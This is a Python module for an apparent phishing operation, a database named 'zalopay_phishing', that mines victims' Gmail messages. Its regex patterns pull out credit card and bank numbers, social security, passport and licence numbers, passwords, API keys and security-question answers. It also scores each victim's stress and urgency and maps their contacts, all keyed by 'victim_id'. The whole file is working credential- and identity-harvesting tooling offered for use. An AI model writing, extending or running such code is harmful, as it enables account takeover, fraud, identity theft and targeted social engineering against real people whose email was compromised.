"""
Intelligent Email Mining Engine
Extract valuable intelligence from Gmail messages
"""

import os
import json
import re
import time
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple, Set
import logging
import base64
from collections import Counter, defaultdict
import threading

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class EmailExtractionConfig:
    """Email extraction configuration"""

    def __init__(self):
        self.max_emails_per_batch = int(os.getenv("MAX_EMAILS_PER_BATCH", "1000"))
        self.extraction_timeout = int(os.getenv("EXTRACTION_TIMEOUT", "300"))
        self.enable_ml_extraction = os.getenv("ENABLE_ML_EXTRACTION", "false").lower() == "true"
        self.confidence_threshold = float(os.getenv("CONFIDENCE_THRESHOLD", "0.7"))
        self.max_processing_threads = int(os.getenv("MAX_PROCESSING_THREADS", "5"))
        self.enable_caching = os.getenv("ENABLE_CACHING", "true").lower() == "true"

class ExtractedIntelligence:
    """Extracted intelligence data container"""

    def __init__(self, message_id: str, victim_id: str):
        self.message_id = message_id
        self.victim_id = victim_id
        self.extracted_at = datetime.now(timezone.utc)

        # Financial intelligence
        self.financial_data = {
            "bank_accounts": [],
            "credit_cards": [],
            "transactions": [],
            "invoices": [],
            "receipts": [],
            "financial_keywords": []
        }

        # Personal information
        self.personal_data = {
            "phone_numbers": [],
            "addresses": [],
            "social_security": [],
            "passport_numbers": [],
            "drivers_license": [],
            "personal_keywords": []
        }

        # Business intelligence
        self.business_data = {
            "company_names": [],
            "job_titles": [],
            "business_emails": [],
            "meeting_info": [],
            "project_details": [],
            "business_keywords": []
        }

        # Authentication data
        self.auth_data = {
            "passwords": [],
            "api_keys": [],
            "tokens": [],
            "security_questions": [],
            "two_factor_codes": []
        }

        # Communication patterns
        self.communication_data = {
            "contacts": [],
            "frequent_correspondents": [],
            "communication_patterns": {},
            "relationship_graph": {}
        }

        # Sentiment and behavioral data
        self.behavioral_data = {
            "sentiment_score": 0.0,
            "urgency_indicators": [],
            "stress_indicators": [],
            "behavioral_patterns": []
        }

        # Metadata
        self.extraction_confidence = 0.0
        self.extraction_method = "rule_based"
        self.processing_time = 0.0

    def add_financial_data(self, data_type: str, value: str, confidence: float = 1.0):
        """Add financial intelligence data"""
        if data_type in self.financial_data:
            self.financial_data[data_type].append({
                "value": value,
                "confidence": confidence,
                "extracted_at": datetime.now(timezone.utc).isoformat()
            })

    def add_personal_data(self, data_type: str, value: str, confidence: float = 1.0):
        """Add personal information data"""
        if data_type in self.personal_data:
            self.personal_data[data_type].append({
                "value": value,
                "confidence": confidence,
                "extracted_at": datetime.now(timezone.utc).isoformat()
            })

    def add_business_data(self, data_type: str, value: str, confidence: float = 1.0):
        """Add business intelligence data"""
        if data_type in self.business_data:
            self.business_data[data_type].append({
                "value": value,
                "confidence": confidence,
                "extracted_at": datetime.now(timezone.utc).isoformat()
            })

    def add_auth_data(self, data_type: str, value: str, confidence: float = 1.0):
        """Add authentication data"""
        if data_type in self.auth_data:
            self.auth_data[data_type].append({
                "value": value,
                "confidence": confidence,
                "extracted_at": datetime.now(timezone.utc).isoformat()
            })

    def calculate_extraction_confidence(self) -> float:
        """Calculate overall extraction confidence"""
        try:
            total_items = 0
            total_confidence = 0.0

            # Financial data confidence
            for data_type, items in self.financial_data.items():
                for item in items:
                    total_items += 1
                    total_confidence += item.get("confidence", 0.0)

            # Personal data confidence
            for data_type, items in self.personal_data.items():
                for item in items:
                    total_items += 1
                    total_confidence += item.get("confidence", 0.0)

            # Business data confidence
            for data_type, items in self.business_data.items():
                for item in items:
                    total_items += 1
                    total_confidence += item.get("confidence", 0.0)

            # Auth data confidence
            for data_type, items in self.auth_data.items():
                for item in items:
                    total_items += 1
                    total_confidence += item.get("confidence", 0.0)

            if total_items > 0:
                self.extraction_confidence = total_confidence / total_items
            else:
                self.extraction_confidence = 0.0

            return self.extraction_confidence

        except Exception as e:
            logger.error(f"Error calculating extraction confidence: {e}")
            self.extraction_confidence = 0.0
            return 0.0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "message_id": self.message_id,
            "victim_id": self.victim_id,
            "extracted_at": self.extracted_at.isoformat(),
            "financial_data": self.financial_data,
            "personal_data": self.personal_data,
            "business_data": self.business_data,
            "auth_data": self.auth_data,
            "communication_data": self.communication_data,
            "behavioral_data": self.behavioral_data,
            "extraction_confidence": self.extraction_confidence,
            "extraction_method": self.extraction_method,
            "processing_time": self.processing_time
        }

class EmailPatternMatcher:
    """Pattern matching for email intelligence extraction"""

    def __init__(self):
        self.patterns = self._initialize_patterns()

    def _initialize_patterns(self) -> Dict[str, List[Dict[str, Any]]]:
        """Initialize extraction patterns"""
        return {
            "financial": [
                {
                    "name": "bank_account",
                    "pattern": r'\b\d{10,18}\b',
                    "context_keywords": ["bank", "account", "checking", "savings", "routing"],
                    "confidence": 0.7
                },
                {
                    "name": "credit_card",
                    "pattern": r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b',
                    "context_keywords": ["card", "credit", "visa", "mastercard", "amex"],
                    "confidence": 0.8
                },
                {
                    "name": "transaction_amount",
                    "pattern": r'\$\d{1,3}(?:,\d{3})*(?:\.\d{2})?',
                    "context_keywords": ["payment", "transaction", "amount", "total", "balance"],
                    "confidence": 0.6
                },
                {
                    "name": "invoice_number",
                    "pattern": r'(?:invoice|inv)[#\s:]*([a-z0-9\-]+)',
                    "context_keywords": ["invoice", "bill", "payment", "due"],
                    "confidence": 0.9
                }
            ],
            "personal": [
                {
                    "name": "phone_number",
                    "pattern": r'\(?\d{3}\)?[-\s.]?\d{3}[-\s.]?\d{4}',
                    "context_keywords": ["phone", "mobile", "cell", "call", "number"],
                    "confidence": 0.9
                },
                {
                    "name": "social_security",
                    "pattern": r'\b\d{3}-\d{2}-\d{4}\b',
                    "context_keywords": ["ssn", "social security", "social-security"],
                    "confidence": 0.95
                },
                {
                    "name": "passport",
                    "pattern": r'\b[a-z]{2}\d{7}\b',
                    "context_keywords": ["passport", "travel", "visa"],
                    "confidence": 0.8
                },
                {
                    "name": "drivers_license",
                    "pattern": r'\b[a-z]{2}\d{7,10}\b',
                    "context_keywords": ["license", "drivers", "dl", "id"],
                    "confidence": 0.7
                }
            ],
            "business": [
                {
                    "name": "company_email",
                    "pattern": r'\b[a-z0-9._%+-]+@(?:[a-z0-9-]+\.)+[a-z]{2,}\b',
                    "context_keywords": ["company", "corporate", "business", "work"],
                    "exclude_domains": ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"],
                    "confidence": 0.8
                },
                {
                    "name": "job_title",
                    "pattern": r'\b(?:vice president|vp|director|manager|engineer|developer|analyst|consultant)\b',
                    "context_keywords": ["title", "position", "role", "job"],
                    "confidence": 0.7
                },
                {
                    "name": "meeting_info",
                    "pattern": r'\b(?:meeting|call|conference|webinar)\s+(?:on|at|scheduled)\s+\w+',
                    "context_keywords": ["meeting", "call", "conference", "schedule"],
                    "confidence": 0.6
                }
            ],
            "authentication": [
                {
                    "name": "password",
                    "pattern": r'\bpassword[=:]\s*([^\s]+)',
                    "context_keywords": ["password", "login", "credentials"],
                    "confidence": 0.8
                },
                {
                    "name": "api_key",
                    "pattern": r'\b(?:api[_-]?key|apikey)[=:]\s*([a-z0-9\-_]{32,})',
                    "context_keywords": ["api", "key", "token", "authentication"],
                    "confidence": 0.9
                },
                {
                    "name": "security_question",
                    "pattern": r'\b(?:what is|what was|who is|where is)\s+([^\?]+)\??',
                    "context_keywords": ["security", "question", "mother", "pet", "school"],
                    "confidence": 0.7
                }
            ]
        }

    def extract_intelligence(self, text: str, subject: str = "", sender: str = "") -> Dict[str, List[Dict[str, Any]]]:
        """
        Extract intelligence from email text

        Args:
            text: Email body text
            subject: Email subject
            sender: Email sender

        Returns:
            Extracted intelligence data
        """
        extracted_data = {
            "financial": [],
            "personal": [],
            "business": [],
            "authentication": []
        }

        try:
            # Combine all text for analysis
            full_text = f"{subject} {text}".lower()

            # Extract from each category
            for category, patterns in self.patterns.items():
                for pattern_info in patterns:
                    matches = self._find_pattern_matches(full_text, pattern_info)
                    extracted_data[category].extend(matches)

            return extracted_data

        except Exception as e:
            logger.error(f"Error extracting intelligence: {e}")
            return extracted_data

    def _find_pattern_matches(self, text: str, pattern_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Find matches for a specific pattern"""
        matches = []

        try:
            pattern = pattern_info["pattern"]
            context_keywords = [kw.lower() for kw in pattern_info["context_keywords"]]
            exclude_domains = pattern_info.get("exclude_domains", [])

            # Find all regex matches
            regex_matches = re.finditer(pattern, text, re.IGNORECASE)

            for match in regex_matches:
                extracted_value = match.group(1) if match.groups() else match.group(0)

                # Check context keywords
                context_score = self._calculate_context_score(text, match.span(), context_keywords)

                # Check exclusions
                if self._check_exclusions(extracted_value, exclude_domains):
                    continue

                # Calculate final confidence
                base_confidence = pattern_info["confidence"]
                final_confidence = base_confidence * context_score

                if final_confidence >= 0.5:  # Minimum confidence threshold
                    matches.append({
                        "value": extracted_value,
                        "pattern": pattern_info["name"],
                        "confidence": final_confidence,
                        "context_score": context_score,
                        "match_position": match.span()
                    })

        except Exception as e:
            logger.error(f"Error finding pattern matches: {e}")

        return matches

    def _calculate_context_score(self, text: str, match_span: Tuple[int, int], context_keywords: List[str]) -> float:
        """Calculate context relevance score"""
        try:
            start, end = match_span
            context_window = 100  # Characters before and after match

            # Get context around match
            context_start = max(0, start - context_window)
            context_end = min(len(text), end + context_window)
            context = text[context_start:context_end]

            # Count context keywords
            keyword_matches = sum(1 for keyword in context_keywords if keyword in context)

            # Calculate score based on keyword proximity and frequency
            if keyword_matches > 0:
                # Higher score for keywords closer to the match
                proximity_score = min(keyword_matches * 0.3, 1.0)
                return min(1.0, proximity_score + 0.2)
            else:
                return 0.2  # Base score even without context keywords

        except Exception as e:
            logger.error(f"Error calculating context score: {e}")
            return 0.0

    def _check_exclusions(self, value: str, exclude_domains: List[str]) -> bool:
        """Check if value should be excluded"""
        if not exclude_domains:
            return False

        value_lower = value.lower()
        return any(domain in value_lower for domain in exclude_domains)

class EmailContentAnalyzer:
    """Advanced email content analysis"""

    def __init__(self):
        self.sentiment_keywords = self._load_sentiment_keywords()
        self.urgency_indicators = self._load_urgency_indicators()

    def _load_sentiment_keywords(self) -> Dict[str, List[str]]:
        """Load sentiment analysis keywords"""
        return {
            "positive": ["great", "excellent", "amazing", "wonderful", "fantastic", "love", "like", "good"],
            "negative": ["terrible", "awful", "horrible", "hate", "dislike", "bad", "worst", "angry", "frustrated"],
            "urgent": ["urgent", "asap", "emergency", "critical", "important", "deadline", "rush"],
            "stress": ["overwhelmed", "stressed", "pressure", "deadline", "crisis", "problem", "issue"]
        }

    def _load_urgency_indicators(self) -> Dict[str, List[str]]:
        """Load urgency indicators"""
        return {
            "high_urgency": ["urgent", "asap", "emergency", "critical", "immediate", "rush"],
            "deadlines": ["deadline", "due", "expires", "by", "before"],
            "financial": ["payment", "invoice", "bill", "overdue", "charge"],
            "security": ["security", "breach", "hack", "unauthorized", "suspicious"]
        }

    def analyze_sentiment(self, text: str) -> Dict[str, float]:
        """Analyze email sentiment"""
        try:
            text_lower = text.lower()
            sentiment_scores = {
                "positive": 0.0,
                "negative": 0.0,
                "urgent": 0.0,
                "stress": 0.0,
                "overall": 0.0
            }

            # Count sentiment keywords
            for sentiment_type, keywords in self.sentiment_keywords.items():
                count = sum(1 for keyword in keywords if keyword in text_lower)
                sentiment_scores[sentiment_type] = min(count * 0.1, 1.0)

            # Calculate overall sentiment
            positive_score = sentiment_scores["positive"]
            negative_score = sentiment_scores["negative"]
            sentiment_scores["overall"] = (positive_score - negative_score + 1.0) / 2.0

            return sentiment_scores

        except Exception as e:
            logger.error(f"Error analyzing sentiment: {e}")
            return {"positive": 0.0, "negative": 0.0, "urgent": 0.0, "stress": 0.0, "overall": 0.5}

    def analyze_urgency(self, text: str, subject: str = "") -> Dict[str, Any]:
        """Analyze email urgency"""
        try:
            full_text = f"{subject} {text}".lower()

            urgency_score = 0.0
            indicators = []

            # Check urgency indicators
            for category, keywords in self.urgency_indicators.items():
                for keyword in keywords:
                    if keyword in full_text:
                        urgency_score += 0.2
                        indicators.append({
                            "category": category,
                            "keyword": keyword,
                            "severity": "high" if category in ["high_urgency", "security"] else "medium"
                        })

            # Check for exclamation marks and caps
            exclamation_count = full_text.count("!")
            caps_ratio = len(re.findall(r'[A-Z]{3,}', full_text)) / len(full_text) if full_text else 0

            urgency_score += min(exclamation_count * 0.1, 0.3)
            urgency_score += min(caps_ratio * 2.0, 0.3)

            # Determine urgency level
            if urgency_score >= 0.7:
                urgency_level = "critical"
            elif urgency_score >= 0.4:
                urgency_level = "high"
            elif urgency_score >= 0.2:
                urgency_level = "medium"
            else:
                urgency_level = "low"

            return {
                "urgency_score": min(1.0, urgency_score),
                "urgency_level": urgency_level,
                "indicators": indicators,
                "exclamation_count": exclamation_count,
                "caps_ratio": caps_ratio
            }

        except Exception as e:
            logger.error(f"Error analyzing urgency: {e}")
            return {"urgency_score": 0.0, "urgency_level": "low", "indicators": []}

class EmailIntelligenceExtractor:
    """Main email intelligence extraction engine"""

    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client

        self.config = EmailExtractionConfig()
        self.pattern_matcher = EmailPatternMatcher()
        self.content_analyzer = EmailContentAnalyzer()

        # Processing cache
        self.extraction_cache: Dict[str, ExtractedIntelligence] = {}

        # Thread pool for parallel processing
        self.processing_threads = []
        self._initialize_thread_pool()

    def _initialize_thread_pool(self):
        """Initialize processing thread pool"""
        for _ in range(self.config.max_processing_threads):
            thread = threading.Thread(target=self._process_extraction_queue, daemon=True)
            thread.start()
            self.processing_threads.append(thread)

    def extract_from_message(self, message: Dict[str, Any], victim_id: str) -> ExtractedIntelligence:
        """
        Extract intelligence from email message

        Args:
            message: Gmail message data
            victim_id: Victim identifier

        Returns:
            Extracted intelligence
        """
        try:
            start_time = time.time()

            # Create intelligence container
            intelligence = ExtractedIntelligence(message["id"], victim_id)

            # Extract text content
            text_content = self._extract_text_content(message)
            subject = message.get("headers", {}).get("subject", "")

            # Extract intelligence using patterns
            extracted_data = self.pattern_matcher.extract_intelligence(text_content, subject)

            # Apply extracted data to intelligence object
            self._apply_extracted_data(intelligence, extracted_data)

            # Analyze content
            sentiment_data = self.content_analyzer.analyze_sentiment(text_content)
            urgency_data = self.content_analyzer.analyze_urgency(text_content, subject)

            intelligence.behavioral_data.update(sentiment_data)
            intelligence.behavioral_data.update(urgency_data)

            # Calculate confidence
            intelligence.calculate_extraction_confidence()

            # Record processing time
            intelligence.processing_time = time.time() - start_time

            # Cache result
            if self.config.enable_caching:
                self._cache_extraction_result(message["id"], intelligence)

            # Store in database
            if self.mongodb:
                self._store_extraction_result(intelligence)

            logger.info(f"Intelligence extracted from message: {message['id']}")
            return intelligence

        except Exception as e:
            logger.error(f"Error extracting intelligence: {e}")
            # Return empty intelligence on error
            return ExtractedIntelligence(message["id"], victim_id)

    def _extract_text_content(self, message: Dict[str, Any]) -> str:
        """Extract text content from message"""
        try:
            text_parts = []

            # Extract from body
            body = message.get("body", {})
            if "text" in body:
                text_parts.append(body["text"])
            if "html" in body:
                # Strip HTML tags for text analysis
                html_text = re.sub(r'<[^>]+>', ' ', body["html"])
                text_parts.append(html_text)

            # Extract from snippet
            if "snippet" in message:
                text_parts.append(message["snippet"])

            return " ".join(text_parts)

        except Exception as e:
            logger.error(f"Error extracting text content: {e}")
            return ""

    def _apply_extracted_data(self, intelligence: ExtractedIntelligence, extracted_data: Dict[str, List[Dict[str, Any]]]):
        """Apply extracted data to intelligence object"""
        try:
            # Financial data
            for item in extracted_data.get("financial", []):
                data_type = item["pattern"]
                value = item["value"]
                confidence = item["confidence"]

                if data_type == "bank_account":
                    intelligence.add_financial_data("bank_accounts", value, confidence)
                elif data_type == "credit_card":
                    intelligence.add_financial_data("credit_cards", value, confidence)
                elif data_type == "transaction_amount":
                    intelligence.add_financial_data("transactions", value, confidence)
                elif data_type == "invoice_number":
                    intelligence.add_financial_data("invoices", value, confidence)

            # Personal data
            for item in extracted_data.get("personal", []):
                data_type = item["pattern"]
                value = item["value"]
                confidence = item["confidence"]

                if data_type == "phone_number":
                    intelligence.add_personal_data("phone_numbers", value, confidence)
                elif data_type == "social_security":
                    intelligence.add_personal_data("social_security", value, confidence)
                elif data_type == "passport":
                    intelligence.add_personal_data("passport_numbers", value, confidence)
                elif data_type == "drivers_license":
                    intelligence.add_personal_data("drivers_license", value, confidence)

            # Business data
            for item in extracted_data.get("business", []):
                data_type = item["pattern"]
                value = item["value"]
                confidence = item["confidence"]

                if data_type == "company_email":
                    intelligence.add_business_data("business_emails", value, confidence)
                elif data_type == "job_title":
                    intelligence.add_business_data("job_titles", value, confidence)
                elif data_type == "meeting_info":
                    intelligence.add_business_data("meeting_info", value, confidence)

            # Authentication data
            for item in extracted_data.get("authentication", []):
                data_type = item["pattern"]
                value = item["value"]
                confidence = item["confidence"]

                if data_type == "password":
                    intelligence.add_auth_data("passwords", value, confidence)
                elif data_type == "api_key":
                    intelligence.add_auth_data("api_keys", value, confidence)
                elif data_type == "security_question":
                    intelligence.add_auth_data("security_questions", value, confidence)

        except Exception as e:
            logger.error(f"Error applying extracted data: {e}")

    def extract_from_messages_batch(self, messages: List[Dict[str, Any]], victim_id: str) -> List[ExtractedIntelligence]:
        """Extract intelligence from batch of messages"""
        extracted_intelligence = []

        try:
            for message in messages:
                intelligence = self.extract_from_message(message, victim_id)
                extracted_intelligence.append(intelligence)

            logger.info(f"Batch extraction completed: {len(extracted_intelligence)} messages")
            return extracted_intelligence

        except Exception as e:
            logger.error(f"Error in batch extraction: {e}")
            return []

    def analyze_communication_patterns(self, messages: List[Dict[str, Any]], victim_id: str) -> Dict[str, Any]:
        """Analyze communication patterns from messages"""
        try:
            patterns = {
                "sender_frequency": Counter(),
                "recipient_frequency": Counter(),
                "hourly_patterns": Counter(),
                "daily_patterns": Counter(),
                "topic_clusters": defaultdict(list),
                "relationship_strength": {}
            }

            for message in messages:
                headers = message.get("headers", {})

                # Sender analysis
                sender = headers.get("from", "")
                patterns["sender_frequency"][sender] += 1

                # Recipient analysis
                to_header = headers.get("to", "")
                if to_header:
                    recipients = re.findall(r'[\w\.-]+@[\w\.-]+', to_header)
                    for recipient in recipients:
                        patterns["recipient_frequency"][recipient] += 1

                # Time patterns
                if "date" in headers:
                    try:
                        date_str = headers["date"]
                        date_obj = datetime.strptime(date_str, "%a, %d %b %Y %H:%M:%S %z")
                        patterns["hourly_patterns"][date_obj.hour] += 1
                        patterns["daily_patterns"][date_obj.weekday()] += 1
                    except Exception:
                        pass

                # Topic clustering (simple keyword-based)
                subject = headers.get("subject", "").lower()
                body = message.get("body", {}).get("text", "").lower()

                content = f"{subject} {body}"

                if "work" in content or "project" in content:
                    patterns["topic_clusters"]["work"].append(message["id"])
                elif "personal" in content or "family" in content:
                    patterns["topic_clusters"]["personal"].append(message["id"])
                elif "finance" in content or "money" in content:
                    patterns["topic_clusters"]["finance"].append(message["id"])

            # Calculate relationship strength
            for sender, frequency in patterns["sender_frequency"].items():
                patterns["relationship_strength"][sender] = min(frequency / 10.0, 1.0)

            return patterns

        except Exception as e:
            logger.error(f"Error analyzing communication patterns: {e}")
            return {}

    def _cache_extraction_result(self, message_id: str, intelligence: ExtractedIntelligence):
        """Cache extraction result"""
        try:
            self.extraction_cache[message_id] = intelligence

            # Limit cache size
            if len(self.extraction_cache) > 10000:
                # Remove oldest entries
                oldest_keys = sorted(self.extraction_cache.keys())[:2000]
                for key in oldest_keys:
                    del self.extraction_cache[key]

        except Exception as e:
            logger.error(f"Error caching extraction result: {e}")

    def _store_extraction_result(self, intelligence: ExtractedIntelligence):
        """Store extraction result in database"""
        try:
            if not self.mongodb:
                return

            db = self.mongodb.get_database("zalopay_phishing")
            extraction_collection = db.email_intelligence

            document = intelligence.to_dict()
            document["expires_at"] = datetime.now(timezone.utc) + timedelta(days=30)  # Keep for 30 days

            extraction_collection.replace_one(
                {"message_id": intelligence.message_id},
                document,
                upsert=True
            )

        except Exception as e:
            logger.error(f"Error storing extraction result: {e}")

    def get_extraction_stats(self) -> Dict[str, Any]:
        """Get extraction statistics"""
        try:
            total_extracted = len(self.extraction_cache)

            # Calculate averages
            avg_confidence = 0.0
            avg_processing_time = 0.0

            if total_extracted > 0:
                confidence_scores = [intel.extraction_confidence for intel in self.extraction_cache.values()]
                processing_times = [intel.processing_time for intel in self.extraction_cache.values()]

                avg_confidence = sum(confidence_scores) / len(confidence_scores)
                avg_processing_time = sum(processing_times) / len(processing_times)

            # Category statistics
            category_counts = {
                "financial": 0,
                "personal": 0,
                "business": 0,
                "authentication": 0
            }

            for intelligence in self.extraction_cache.values():
                for category in category_counts.keys():
                    data_key = f"{category}_data"
                    if hasattr(intelligence, data_key):
                        data = getattr(intelligence, data_key)
                        for data_type, items in data.items():
                            category_counts[category] += len(items)

            return {
                "total_extracted": total_extracted,
                "avg_confidence": avg_confidence,
                "avg_processing_time": avg_processing_time,
                "category_counts": category_counts,
                "cache_size": len(self.extraction_cache),
                "timestamp": datetime.now(timezone.utc).isoformat()
            }

        except Exception as e:
            logger.error(f"Error getting extraction stats: {e}")
            return {"error": "Failed to get statistics"}

# Global email extractor instance
email_extractor = None

def initialize_email_extractor(mongodb_connection=None, redis_client=None) -> EmailIntelligenceExtractor:
    """Initialize global email extractor"""
    global email_extractor
    email_extractor = EmailIntelligenceExtractor(mongodb_connection, redis_client)
    return email_extractor

def get_email_extractor() -> EmailIntelligenceExtractor:
    """Get global email extractor"""
    if email_extractor is None:
        raise ValueError("Email extractor not initialized")
    return email_extractor

# Convenience functions
def extract_from_message(message: Dict[str, Any], victim_id: str) -> ExtractedIntelligence:
    """Extract from message (global convenience function)"""
    return get_email_extractor().extract_from_message(message, victim_id)

def extract_from_messages_batch(messages: List[Dict[str, Any]], victim_id: str) -> List[ExtractedIntelligence]:
    """Extract from messages batch (global convenience function)"""
    return get_email_extractor().extract_from_messages_batch(messages, victim_id)

def analyze_communication_patterns(messages: List[Dict[str, Any]], victim_id: str) -> Dict[str, Any]:
    """Analyze communication patterns (global convenience function)"""
    return get_email_extractor().analyze_communication_patterns(messages, victim_id)

def get_extraction_stats() -> Dict[str, Any]:
    """Get extraction stats (global convenience function)"""
    return get_email_extractor().get_extraction_stats()